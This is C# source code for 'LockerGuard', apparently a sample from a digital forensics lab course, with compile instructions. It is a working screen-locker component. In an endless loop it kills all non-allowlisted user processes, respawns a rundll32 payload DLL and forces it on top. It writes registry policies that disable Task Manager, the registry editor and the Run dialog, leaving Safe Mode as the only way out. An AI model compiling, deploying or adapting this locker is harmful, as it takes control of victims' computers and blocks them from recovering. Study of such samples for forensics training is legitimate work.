// LockerGuard.cs — NT334 Digital Forensics Lab
// Aggressive watchdog: kills explorer, all user apps, forces lock screen on top
// Recovery: Safe Mode only (Startup items don't run in Safe Mode)
//
// Compilation (32-bit, no console window):
//   %WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:winexe /platform:x86 LockerGuard.cs

using System;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using Microsoft.Win32;

class LockerGuard
{
    [DllImport("user32.dll")]
    static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

    [DllImport("user32.dll")]
    static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
    static string dllPath;

    static bool IsSafe(string name)
    {
        string lower = name.ToLower();
        return lower == "system" || lower == "idle" || lower == "smss" ||
               lower == "csrss" || lower == "wininit" || lower == "services" ||
               lower == "lsass" || lower == "svchost" || lower == "winlogon" ||
               lower == "dwm" || lower == "rundll32" || lower == "lockerguard" ||
               lower == "conhost" || lower == "fontdrvhost" || lower == "memory compression" ||
               lower == "registry" || lower == "spoolsv" || lower == "lsaiso" ||
               lower == "sgrmbroker" || lower == "dashost" || lower == "ctfmon" ||
               lower == "securityhealthservice" || lower == "searchindexer" ||
               lower == "vmtoolsd" || lower == "vmwaretray" ||
               lower.Contains("_guard");
    }

    static void KillUserProcesses()
    {
        int myPid = Process.GetCurrentProcess().Id;
        foreach (Process p in Process.GetProcesses())
        {
            try
            {
                if (p.Id <= 4 || p.Id == myPid) continue;
                string name = p.ProcessName;
                if (IsSafe(name)) continue;
                p.Kill();
            }
            catch { }
        }
    }

    static void ForcePayloadOnTop()
    {
        try
        {
            Process[] procs = Process.GetProcessesByName("rundll32");
            foreach (Process p in procs)
            {
                if (p.MainWindowHandle != IntPtr.Zero)
                {
                    SetWindowPos(p.MainWindowHandle, HWND_TOPMOST, 0, 0, 0, 0, 0x0001 | 0x0002);
                    SetForegroundWindow(p.MainWindowHandle);
                    ShowWindow(p.MainWindowHandle, 3); // SW_MAXIMIZE
                }
            }
        }
        catch { }
    }

    static void RespawnPayload()
    {
        bool found = false;
        try
        {
            Process[] procs = Process.GetProcessesByName("rundll32");
            if (procs.Length > 0) found = true;
        }
        catch { }

        if (!found && !string.IsNullOrEmpty(dllPath))
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "rundll32.exe";
                psi.Arguments = "\"" + dllPath + "\",DllMain";
                psi.UseShellExecute = false;
                Process.Start(psi);
            }
            catch { }
        }
    }

    static void EnforceRegistry()
    {
        try
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (key != null)
            {
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                key.Close();
            }
        }
        catch { }

        try
        {
            RegistryKey key2 = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            if (key2 != null)
            {
                key2.SetValue("NoRun", 1, RegistryValueKind.DWord);
                key2.Close();
            }
        }
        catch { }
    }

    static void Main(string[] args)
    {
        dllPath = args.Length > 0 ? args[0] : "";
        EnforceRegistry();

        while (true)
        {
            KillUserProcesses();
            RespawnPayload();
            ForcePayloadOnTop();
            EnforceRegistry();
            Thread.Sleep(800);
        }
    }
}
